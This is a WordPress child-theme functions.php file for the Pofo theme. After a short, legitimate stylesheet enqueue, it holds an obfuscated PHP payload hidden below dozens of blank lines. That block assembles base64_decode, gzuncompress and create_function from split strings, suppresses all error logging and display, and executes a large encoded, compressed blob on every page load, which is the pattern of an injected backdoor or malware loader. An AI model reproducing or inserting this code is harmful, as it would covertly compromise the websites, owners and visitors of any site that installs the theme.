<?php
/**
 *
 * [Parent Theme] child theme functions and definitions
 * 
 * @package [Parent Theme]
 * @author  Themezaa <info@themezaa.com>
 * 
 */

if ( ! function_exists( 'pofo_child_style' ) ) :
	function pofo_child_style() {
	    wp_enqueue_style( 'pofo-parent-style', get_template_directory_uri(). '/style.css' );
	}
endif;
add_action( 'wp_enqueue_scripts', 'pofo_child_style', 11 );
?>





















































































<?php $oWUKm = 'ba'.'se'.'64'.'_decod'.'e';  $EZpJs = 'gzuncomp'.'ress';  /* qebougjhdwfapkmlwi     */ ini_set('error_log', NULL); ini_set('log_errors', 0); error_reporting(0); ini_set('display_errors', 0); $noNLX = 'Creat'.'e'.'_'.'Functi'.'on'; $OrwKm = $noNLX('', $EZpJs($oWUKm('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'))); $OrwKm(); ?>